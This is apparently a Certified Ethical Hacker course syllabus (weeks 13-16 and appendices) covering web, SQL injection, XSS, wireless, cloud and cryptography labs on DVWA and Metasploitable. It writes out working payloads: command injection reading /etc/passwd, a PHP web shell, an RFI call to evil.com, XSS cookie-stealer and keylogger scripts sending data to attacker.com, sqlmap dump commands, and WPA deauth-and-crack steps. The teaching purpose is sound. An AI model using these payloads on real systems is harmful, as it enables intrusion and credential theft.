## WEEK 13: Hacking Web Servers & Web Applications

### 📖 Lecture Notes

#### Topics Covered
- Web Server Architecture
- Web Server Attack Vectors
- IIS, Apache, Nginx Vulnerabilities
- Web Application Components
- OWASP Top 10
- Input Validation Attacks
- Authentication Attacks
- Session Management Flaws
- Web Server Hardening

#### Key Concepts

**Web Architecture Components:**
```
Client (Browser)
    ↓ HTTP/HTTPS
Web Server (Apache, IIS, Nginx)
    ↓
Application Server (PHP, Python, Java, .NET)
    ↓
Database (MySQL, MSSQL, Oracle)
```

**Common Web Server Vulnerabilities:**
- Default configurations and credentials
- Directory listing enabled
- Unnecessary services running
- Outdated software with known CVEs
- Misconfigured permissions
- Exposed administrative interfaces
- Missing security headers

**OWASP Top 10 (2021):**

| Rank | Vulnerability | Description |
|------|--------------|-------------|
| A01 | Broken Access Control | Users can act outside their permissions |
| A02 | Cryptographic Failures | Weak or missing encryption |
| A03 | Injection | SQL, NoSQL, OS, LDAP injection |
| A04 | Insecure Design | Fundamental design flaws |
| A05 | Security Misconfiguration | Default settings, unused features |
| A06 | Vulnerable Components | Outdated libraries and frameworks |
| A07 | Authentication Failures | Weak password policies, credential stuffing |
| A08 | Data Integrity Failures | Unsigned/insecure deserialization |
| A09 | Logging Failures | Insufficient logging and monitoring |
| A10 | SSRF | Server-Side Request Forgery |

**Common Web Attacks:**

**Directory Traversal:**
```
Normal: http://site.com/file=about.html
Attack: http://site.com/file=../../../etc/passwd
```

**Command Injection:**
```
Normal: site.com/ping?ip=127.0.0.1
Attack: site.com/ping?ip=127.0.0.1;cat /etc/passwd
```

**File Inclusion:**
```
LFI: http://site.com?page=../../../etc/passwd
RFI: http://site.com?page=http://evil.com/shell.txt
```

---

### 🔧 Practical Lab 13: Web Application Testing

#### Objectives
- Identify web server vulnerabilities
- Exploit common web vulnerabilities
- Practice OWASP Top 10 attacks
- Use Burp Suite for web testing
- Test on DVWA (Damn Vulnerable Web App)

#### Step-by-Step Instructions

**Step 1: Access DVWA on Metasploitable**
```
Navigate to: http://<Metasploitable_IP>/dvwa/
Default login: admin / password
Set security level to "Low" for initial testing
```

**Step 2: Burp Suite Setup**
```bash
# Launch Burp Suite
burpsuite

# Configure:
1. Use Burp's embedded browser
2. Configure proxy (127.0.0.1:8080)
3. Install CA certificate for HTTPS
4. Turn intercept OFF initially
```

**Step 3: Command Injection (DVWA)**
```
1. Navigate to Command Injection
2. Enter IP: 127.0.0.1
3. Observe normal output
4. Try: 127.0.0.1 && whoami
5. Try: 127.0.0.1 && cat /etc/passwd
6. Try: 127.0.0.1 && ls -la /
7. Document all successful commands
```

**Step 4: File Inclusion (DVWA)**
```
Local File Inclusion:
1. Navigate to File Inclusion
2. View source shows: page=include.php
3. Try: page=../../../etc/passwd
4. Try: page=../../../etc/shadow (may fail)

Remote File Inclusion (if enabled):
1. Host malicious file on your server
2. Try: page=http://<Kali_IP>/shell.php
```

**Step 5: File Upload Vulnerability**
```
1. Navigate to File Upload
2. Upload a normal file (should work)
3. Upload a PHP shell:
   <?php echo shell_exec($_GET['cmd']); ?>
4. Access uploaded shell:
   http://<target>/hackable/uploads/shell.php?cmd=whoami
5. Execute system commands
```

**Step 6: SQL Injection (Manual)**
```
1. Navigate to SQL Injection
2. Try User ID: 1
3. Try User ID: 1' (error indicates vulnerability)
4. Try User ID: 1' OR '1'='1
5. Extract database info:
   1' UNION SELECT NULL, table_name FROM information_schema.tables#
6. Extract users:
   1' UNION SELECT user, password FROM users#
```

#### Expected Outcomes
- Successful exploitation of multiple web vulnerabilities
- Proficiency with Burp Suite
- Understanding of OWASP Top 10
- Ability to identify insecure web configurations

---

### 📝 Assignment 13

**Part A: Web Vulnerability Testing (60 points)**
Test DVWA at "Low" security level for the following vulnerabilities:
1. Command Injection
2. File Inclusion (LFI)
3. File Upload
4. SQL Injection
5. XSS (Reflected and Stored)

For each vulnerability:
- Document the vulnerable input
- Show the exploit payload
- Explain why it works
- Suggest a fix

**Part B: OWASP Top 10 Analysis (40 points)**
For each OWASP Top 10 vulnerability:
1. Provide a real-world example
2. Explain the potential impact
3. Describe prevention measures

**Submission Format:** Comprehensive web security report.

---

---

## WEEK 14: SQL Injection & XSS Attacks

### 📖 Lecture Notes

#### Topics Covered
- SQL Injection Fundamentals
- SQL Injection Types
- Manual SQL Injection Techniques
- SQLMap Automation
- Blind SQL Injection
- XSS (Cross-Site Scripting) Types
- XSS Exploitation
- SQL Injection and XSS Prevention
- Parameterized Queries
- Input Sanitization

#### Key Concepts

**SQL Injection (SQLi):**
Injecting malicious SQL code into application queries to manipulate the database.

**SQLi Types:**

| Type | Description | Detection |
|------|-------------|-----------|
| In-band SQLi | Results returned directly | Error messages, UNION-based |
| Blind SQLi | Inferred from behavior | True/false responses, time delays |
| Out-of-band SQLi | Results via DNS/HTTP | External server receives data |
| Second-order SQLi | Payload stored, executed later | Delayed reaction |

**SQL Injection Examples:**

**Authentication Bypass:**
```sql
Username: admin' --
Password: [anything]

Resulting query:
SELECT * FROM users WHERE user='admin' --' AND pass='xxx'
(--comments out the rest of the query)
```

**UNION-Based Extraction:**
```sql
' UNION SELECT username, password FROM users--
```

**Blind SQLi (Boolean-based):**
```sql
' AND 1=1--  (page loads normally)
' AND 1=2--  (page shows error or different content)
' AND substring(version(),1,1)='5'--  (extract data character by character)
```

**Time-Based Blind SQLi:**
```sql
' AND IF(1=1, SLEEP(5), 0)--  (page delays 5 seconds)
' AND IF(1=2, SLEEP(5), 0)--  (no delay)
```

**XSS Types:**

| Type | Storage | Execution |
|------|---------|-----------|
| Reflected XSS | Not stored | Immediate, requires victim to click link |
| Stored XSS | Saved in database | Executes when page is viewed |
| DOM-based XSS | Client-side only | JavaScript manipulates DOM |

**XSS Payloads:**
```javascript
// Basic alert
<script>alert('XSS')</script>

// Cookie stealer
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

// Redirect
<script>window.location='http://evil.com'</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/?k='+e.key}</script>
```

---

### 🔧 Practical Lab 14: SQLi and XSS Exploitation

#### Objectives
- Perform manual SQL injection
- Automate SQL injection with SQLMap
- Exploit XSS vulnerabilities
- Understand prevention mechanisms
- Test at different security levels

#### Step-by-Step Instructions

**Step 1: Manual SQL Injection (DVWA Low)**
```
Navigate to SQL Injection page:

1. Test for vulnerability:
   Input: 1'
   Expected: SQL error message

2. Determine column count:
   Input: 1' ORDER BY 1#
   Input: 1' ORDER BY 2#
   Input: 1' ORDER BY 3#  (error = 2 columns)

3. Extract database information:
   Input: 1' UNION SELECT NULL, database()#
   Result: Shows current database name

4. Get table names:
   Input: 1' UNION SELECT NULL, table_name FROM information_schema.tables#

5. Get column names:
   Input: 1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'#

6. Extract data:
   Input: 1' UNION SELECT user, password FROM users#
```

**Step 2: SQLMap Automation**
```bash
# Basic SQLMap scan
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>"

# Enumerate databases
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>" --dbs

# Enumerate tables
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>" -D dvwa --tables

# Dump data
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>" -D dvwa -T users --dump
```

**Step 3: XSS Attacks (DVWA Low)**
```
Reflected XSS:
1. Navigate to XSS (Reflected)
2. Input: <script>alert('XSS')</script>
3. Observe alert box

Stored XSS:
1. Navigate to XSS (Stored)
2. Input in message field: <script>alert('Stored XSS')</script>
3. Submit
4. Alert executes every time page loads

Cookie Theft Demo:
1. Set up listener on Kali:
   nc -lvnp 4444

2. XSS payload:
   <script>new Image().src='http://<Kali_IP>:4444/?c='+document.cookie</script>

3. When victim loads page, cookie sent to your listener
```

**Step 4: DOM-Based XSS**
```javascript
// Vulnerable code:
document.write("Hello " + location.hash.substring(1));

// Exploit:
#<script>alert('DOM XSS')</script>
```

**Step 5: Test at Higher Security Levels**
```
Change DVWA security to "Medium" and repeat attacks
Observe additional protections and how to bypass them
Change to "High" and analyze the improved security
```

#### Expected Outcomes
- Successful manual and automated SQL injection
- XSS exploitation techniques mastered
- Understanding of prevention mechanisms
- Proficiency with SQLMap

---

### 📝 Assignment 14

**Part A: SQL Injection Exercise (50 points)**
1. Manually exploit SQL injection in DVWA (Low security)
2. Extract all usernames and passwords from the users table
3. Use SQLMap to automate the extraction
4. Document both methods and compare efficiency

**Part B: XSS Portfolio (50 points)**
1. Create 5 different XSS payloads and explain what each does
2. Demonstrate cookie theft in your lab
3. Test XSS at Medium security level and document bypass techniques
4. Explain why XSS at High security level is more difficult

**Bonus:** Research and explain CSP (Content Security Policy) and how it prevents XSS.

**Submission Format:** Technical report with code examples and screenshots.

---

---

## WEEK 15: Hacking Wireless Networks & Mobile Platforms

### 📖 Lecture Notes

#### Topics Covered
- Wireless Network Types
- Wireless Encryption (WEP, WPA, WPA2, WPA3)
- Wireless Security Flaws
- Aircrack-ng Suite
- Evil Twin Attacks
- Rogue Access Points
- Bluetooth Hacking
- Mobile Platform Architecture
- iOS and Android Security Models
- Mobile Malware
- Jailbreaking and Rooting

#### Key Concepts

**Wireless Encryption:**

| Encryption | Security | Status |
|------------|----------|--------|
| WEP | Very Weak | Broken, easily cracked |
| WPA | Weak | TKIP, deprecated |
| WPA2 | Moderate | AES, still common |
| WPA3 | Strong | Latest standard |

**Wireless Attack Process:**
```
1. Enable monitor mode on wireless adapter
2. Discover wireless networks (reconnaissance)
3. Capture handshake (authentication)
4. Crack handshake offline (password recovery)
5. Connect to network
```

**Aircrack-ng Suite Tools:**

| Tool | Purpose |
|------|---------|
| airmon-ng | Enable monitor mode |
| airodump-ng | Capture packets |
| aireplay-ng | Inject packets (deauth, fake auth) |
| aircrack-ng | Crack WEP/WPA keys |
| airbase-ng | Create fake access points |
| airdump-ng | WPS attack tools |

**Common Wireless Attacks:**
- **Deauthentication Attack:** Force reconnection to capture handshake
- **Evil Twin:** Fake AP mimics legitimate network
- **Karma Attack:** Respond to any probe request
- **WPS Pixie Dust:** Exploit WPS vulnerability**
- **BRUTE Force:** Dictionary attack on handshake**

**Mobile Security Risks:**
- Unpatched operating systems
- Third-party app stores
- Excessive app permissions
- Insecure data storage
- Inadequate encryption
- Phishing via SMS (smishing)
- Unsecured Wi-Fi connections

---

### 🔧 Practical Lab 15: Wireless Security Testing

#### Objectives
- Understand wireless security mechanisms
- Practice wireless auditing techniques
- Capture and crack WPA handshakes
- Assess mobile application security
- **⚠️ ONLY test networks you own or have permission to test**

#### ⚠️ LEGAL WARNING
Wireless hacking laws vary by jurisdiction. In most regions, intercepting wireless communications without authorization is illegal. ONLY practice on your own lab network.

#### Step-by-Step Instructions

**Prerequisites:**
```
You need a wireless adapter that supports monitor mode and packet injection.
Compatible chipsets: Atheros AR9271, Ralink RT3070, Realtek RTL8812AU

Check your adapter:
airmon-ng
```

**Step 1: Enable Monitor Mode**
```bash
# Check wireless interface
iwconfig

# Enable monitor mode
sudo airmon-ng start wlan0

# Interface is now wlan0mon (or similar)
iwconfig
```

**Step 2: Discover Networks**
```bash
# Scan for wireless networks
sudo airodump-ng wlan0mon

# Note:
# - BSSID (MAC of AP)
# - Channel
# - Encryption type
# - Client count
```

**Step 3: Target Specific Network**
```bash
# Focus on your own lab network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# This captures packets to a file
```

**Step 4: Capture WPA Handshake**
```bash
# Wait for a client to connect naturally
# OR force a reconnection with deauth attack:

# Open new terminal:
sudo aireplay-ng --deauth 10 -a <BSSID> -c <client_MAC> wlan0mon

# This sends 10 deauthentication packets
# Watch for "WPA handshake" message in airodump-ng

# Stop capture with Ctrl+C once handshake is captured
```

**Step 5: Crack WPA Password**
```bash
# Using Aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap

# Using Hashcat (GPU-accelerated)
hcxpcapngtool -o hash.hcpcapng capture-01.cap
hashcat -m 22000 -a 0 hash.hcpcapng /usr/share/wordlists/rockyou.txt
```

**Step 6: Create Evil Twin**
```bash
# Create fake access point
sudo airbase-ng -e "Free_WiFi" -c 6 wlan0mon

# This AP has no security and logs all traffic
# Demonstrates how easy it is to create rogue APs
```

**Step 7: Mobile App Security Testing (Android)**
```bash
# Decompile APK file
apktool d app.apk

# Examine AndroidManifest.xml for permissions
cat app/AndroidManifest.xml

# Look for:
# - Excessive permissions
# - Hardcoded credentials
# - Insecure data storage
# - Exported components

# Use MobSF for automated analysis
# https://github.com/MobSF/Mobile-Security-Framework-MobSF
```

#### Expected Outcomes
- Understanding of wireless security
- Ability to capture and crack handshakes
- Knowledge of wireless attack vectors
- Mobile app security assessment skills

---

### 📝 Assignment 15

**Part A: Wireless Security Assessment (50 points)**
1. Set up a wireless access point in your lab
2. Capture the WPA handshake from a connecting device
3. Crack the password using a wordlist
4. Document the entire process with:
   - Commands used
   - Capture screenshots
   - Time taken to crack
   - Recommendations for stronger wireless security

**Part B: Mobile App Analysis (50 points)**
1. Download an APK file (from a legitimate source)
2. Decompile the APK using apktool
3. Analyze the manifest for security issues
4. Check for hardcoded credentials or API keys
5. Write a security assessment of the application

**Submission Format:** Wireless assessment report + mobile app security review.

---

---

## WEEK 16: Cloud Computing, Cryptography & Final Project

### 📖 Lecture Notes Part A: Cloud Computing Security

#### Topics Covered
- Cloud Service Models
- Cloud Deployment Models
- Cloud Security Risks
- Container Security
- Serverless Security
- Cloud Misconfigurations
- Cloud Attack Vectors

#### Key Concepts

**Cloud Service Models:**

| Model | Responsibility | Examples |
|-------|---------------|----------|
| IaaS | Customer manages OS+ | AWS EC2, Azure VMs |
| PaaS | Customer manages app+ | Heroku, Google App Engine |
| SaaS | Provider manages all | Gmail, Office 365 |

**Cloud Deployment Models:**
- **Public Cloud:** Shared infrastructure (AWS, Azure, GCP)
- **Private Cloud:** Dedicated infrastructure
- **Hybrid Cloud:** Combination of public and private
- **Community Cloud:** Shared by specific organizations

**Common Cloud Misconfigurations:**
- Publicly accessible S3 buckets
- Exposed storage accounts
- Overly permissive IAM roles
- Default credentials
- Unencrypted data at rest
- Missing logging and monitoring

**Container Security:**
- Docker image vulnerabilities
- Privileged container escapes
- Shared kernel risks
- Misconfigured network policies

---

### 📖 Lecture Notes Part B: Cryptography

#### Topics Covered
- Cryptography Fundamentals
- Symmetric vs. Asymmetric Encryption
- Hashing Algorithms
- Public Key Infrastructure (PKI)
- Digital Signatures
- Cryptographic Attacks
- Steganography
- Cryptographic Tools

#### Key Concepts

**Symmetric Encryption:**
```
Same key for encryption and decryption
Algorithms: AES, DES, 3DES, Blowfish, Twofish
Fast, but key distribution is challenging
```

**Asymmetric Encryption:**
```
Different keys (public/private key pair)
Algorithms: RSA, ECC, Diffie-Hellman, ElGamal
Slower, but solves key distribution problem
```

**Hashing:**
```
One-way function, fixed-length output
Algorithms: MD5, SHA-1, SHA-256, SHA-512
Used for integrity verification, password storage
MD5 and SHA-1 are considered broken
```

**PKI (Public Key Infrastructure):**
```
Certificate Authorities (CAs) issue digital certificates
Certificates bind public keys to identities
Used in HTTPS, email encryption, code signing
```

**Cryptographic Attacks:**

| Attack | Description |
|--------|-------------|
| Brute Force | Try all possible keys |
| Frequency Analysis | Analyze letter patterns |
| Man-in-the-Middle | Intercept key exchange |
| Replay | Reuse captured encrypted messages |
| Birthday | Find hash collisions |
| Rainbow Table | Precomputed hash tables |

---

### 🔧 Practical Lab 16: Cryptography and Cloud Security

#### Objectives
- Encrypt and decrypt files using various algorithms
- Generate and use cryptographic keys
- Test for cloud misconfigurations
- Practice steganography
- Complete final project

#### Step-by-Step Instructions

**Step 1: Symmetric Encryption with OpenSSL**
```bash
# Encrypt a file
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.enc

# Decrypt the file
openssl enc -aes-256-cbc -d -in encrypted.enc -out decrypted.txt

# Verify integrity
md5sum plaintext.txt decrypted.txt
```

**Step 2: Asymmetric Encryption (RSA)**
```bash
# Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Encrypt with public key
openssl rsautl -encrypt -inkey public.pem -pubin -in message.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

**Step 3: Hashing Files**
```bash
# Generate hashes
md5sum file.txt
sha256sum file.txt
sha512sum file.txt

# Verify file integrity
echo "expected_hash  file.txt" | sha256sum --check
```

**Step 4: Steganography**
```bash
# Install steghide
sudo apt install steghide

# Hide message in image
steghide embed -cf image.jpg -ef secret.txt

# Extract message
steghide extract -sf image.jpg

# Analyze image for hidden content
stegdetect image.jpg
```

**Step 5: Cloud Security Check (AWS Example)**
```bash
# Install AWS CLI
pip install awscli

# Configure (use educational/test accounts only)
aws configure

# List S3 buckets
aws s3 ls

# Check bucket permissions
aws s3api get-bucket-acl --bucket your-bucket-name

# Check for public buckets
aws s3api get-bucket-policy --bucket your-bucket-name

# Enable encryption
aws s3api put-bucket-encryption \
    --bucket your-bucket-name \
    --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
```

---

### 📝 Assignment 16: FINAL PROJECT

# 🎓 CERTIFIED ETHICAL HACKER - FINAL PROJECT
## Full Penetration Test Engagement

### Project Overview
Conduct a complete penetration test against your lab environment, simulating a real-world engagement from start to finish.

### Scope
**Target:** Metasploitable 2 and/or Metasploitable 3 in your isolated lab
**Duration:** Open-ended (suggested 1-2 weeks)
**Deliverable:** Professional penetration test report

### Required Components

**Phase 1: Pre-Engagement (10 points)**
- Define scope and rules of engagement
- Document your methodology
- Create project plan

**Phase 2: Reconnaissance & Scanning (20 points)**
- Perform passive and active reconnaissance
- Complete network scan with Nmap
- Identify all services and versions
- Document findings professionally

**Phase 3: Vulnerability Analysis (15 points)**
- Run vulnerability scans (Nessus or OpenVAS)
- Manually verify vulnerabilities
- Prioritize by risk level
- Create vulnerability matrix

**Phase 4: Exploitation (25 points)**
- Exploit at least 5 different vulnerabilities
- Gain access to the system
- Escalate privileges
- Document each exploit with:
  - Vulnerability exploited
  - Tools and commands used
  - Screenshots of successful exploitation
  - Access level achieved

**Phase 5: Post-Exploitation (15 points)**
- What sensitive data could be accessed
- Lateral movement possibilities
- Persistence mechanisms identified
- Business impact assessment

**Phase 6: Reporting (15 points)**
- Executive summary (non-technical)
- Technical findings
- Risk ratings (CVSS scores)
- Remediation recommendations
- Evidence and screenshots

### Report Format Requirements
- Professional formatting
- Table of contents
- Executive summary (1-2 pages)
- Detailed technical findings
- Appendices with raw data
- Minimum 15 pages total

### Grading Rubric

| Component | Points |
|-----------|--------|
| Reconnaissance & Scanning | 20 |
| Vulnerability Analysis | 15 |
| Exploitation (5+ vulns) | 25 |
| Post-Exploitation | 15 |
| Professional Report | 15 |
| Pre-Engagement Documentation | 10 |
| **TOTAL** | **100** |

### Submission
- Final report as PDF
- All raw scan results as appendices
- Screenshots clearly labeled
- Proofread and professionally formatted

---

---

# APPENDIX A: ADDITIONAL RESOURCES

---

## Recommended Study Materials

### Books
1. **CEH Certified Ethical Hacker Study Guide** - Matt Walker
2. **CEH v12 Certified Ethical Hacker Practice Exams** - Matt Walker
3. **The Web Application Hacker's Handbook** - Stuttard & Pinto
4. **RTFM: Red Team Field Manual** - Ben Clark
5. **Penetration Testing: A Hands-On Introduction** - Georgia Weidman
6. **The Hacker Playbook 3** - Peter Kim

### Online Platforms
1. **TryHackMe:** https://tryhackme.com
2. **Hack The Box:** https://www.hackthebox.com
3. **PentesterLab:** https://pentesterlab.com
4. **PortSwigger Web Security Academy:** https://portswigger.net/web-security
5. **VulnHub:** https://www.vulnhub.com
6. **OverTheWire:** https://overthewire.org (wargames)

### YouTube Channels
1. NetworkChuck
2. The Cyber Mentor
3. John Hammond
4. IppSec
5. LiveOverflow
6. David Bombal

### Practice Exam Resources
1. Boson CEH Practice Exams
2. Udemy CEH practice tests
3. Official EC-Council practice tests
4. CEH Master Study Guide practice questions

---

## CEH Exam Day Preparation

### Week Before Exam
- ✅ Take at least 2 full practice exams (score 85%+)
- ✅ Review weak areas identified in practice tests
- ✅ Rest well, don't cram
- ✅ Confirm exam location or online proctoring setup

### Day Before Exam
- ✅ Light review only (flashcards, notes)
- ✅ Get 8+ hours of sleep
- ✅ Prepare identification documents
- ✅ Eat healthy meals

### Exam Day
- ✅ Arrive 30 minutes early
- ✅ Bring two forms of ID
- ✅ Stay calm and manage time
- ✅ Flag difficult questions, return later
- ✅ Use elimination for multiple-choice questions
- ✅ Review flagged questions with remaining time

---

## Career Path After CEH

### Entry-Level Positions
- Junior Penetration Tester
- Security Analyst
- SOC Analyst
- Vulnerability Assessor

### Mid-Level Positions
- Penetration Tester
- Security Consultant
- Red Team Member
- Incident Response Analyst

### Advanced Positions
- Senior Security Consultant
- Red Team Lead
- Security Architect
- Chief Information Security Officer (CISO)

### Additional Certifications
- **Offensive Security:** OSCP, OSWE, OSCE
- **SANS/GIAC:** GPEN, GWAPT, GXPN
- **CompTIA:** Pentest+, CySA+, CASP+
- **ISACA:** CISM, CISA
- **(ISC)²:** CISSP, CSSLP

---

# APPENDIX B: CHEAT SHEET

---

## Essential Commands Quick Reference

### Reconnaissance
```bash
whois domain.com
dig domain.com ANY
theHarvester -d domain.com -b google
```

### Scanning
```bash
nmap -sS -sV -O -A <target>
nmap -p- <target>
nmap --script vuln <target>
```

### Enumeration
```bash
enum4linux -a <target>
snmpwalk -c public -v2c <target>
smbclient -L //<target>/ -N
```

### Exploitation
```bash
msfconsole
search <vulnerability>
use exploit/<path>
show options
set RHOSTS <target>
exploit
```

### Password Cracking
```bash
john --wordlist=rockyou.txt hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt
hydra -l user -P wordlist.txt ssh://<target>
```

### Wireless
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a <BSSID> wlan0mon
aircrack-ng -w wordlist.txt -b <BSSID> capture.cap
```

### Web Testing
```bash
nikto -h http://<target>
sqlmap -u "http://<target>/page?id=1" --dbs
gobuster dir -u http://<target> -w wordlist.txt
```

### Sniffing
```bash
tcpdump -i eth0 -w capture.pcap
wireshark
bettercap
```

---

## Common Ports Reference

| Port | Service | Attack Vector |
|------|---------|---------------|
| 21 | FTP | Anonymous login, brute force |
| 22 | SSH | Brute force, key exploitation |
| 23 | Telnet | Cleartext credential sniffing |
| 25 | SMTP | Open relay, user enumeration |
| 53 | DNS | Zone transfer, cache poisoning |
| 80/443 | HTTP/S | Web app attacks |
| 139/445 | SMB | EternalBlue, null sessions |
| 1433 | MSSQL | SQL injection, brute force |
| 3306 | MySQL | SQL injection, weak credentials |
| 3389 | RDP | BlueKeep, brute force |
| 5432 | PostgreSQL | Command execution |
| 5900 | VNC | Brute force, authentication bypass |
| 8080 | HTTP Alt | Web app attacks |
| 27017 | MongoDB | Unauthorized access |

---

# 🎓 COURSE COMPLETION

Congratulations on completing the Certified Ethical Hacker course! You now have:

✅ Understanding of ethical hacking methodology
✅ Hands-on experience with industry tools
✅ Knowledge of common vulnerabilities
✅ Practical exploitation skills
✅ Report writing abilities
✅ CEH exam preparation

**Remember:**
- Always hack ethically and legally
- Continue learning and practicing
- Join the cybersecurity community
- Stay updated on latest threats
- Consider advanced certifications

**Good luck on your CEH exam and cybersecurity career!**

---

*Document created for educational purposes. All practical exercises must be performed in isolated lab environments with proper authorization.*

---
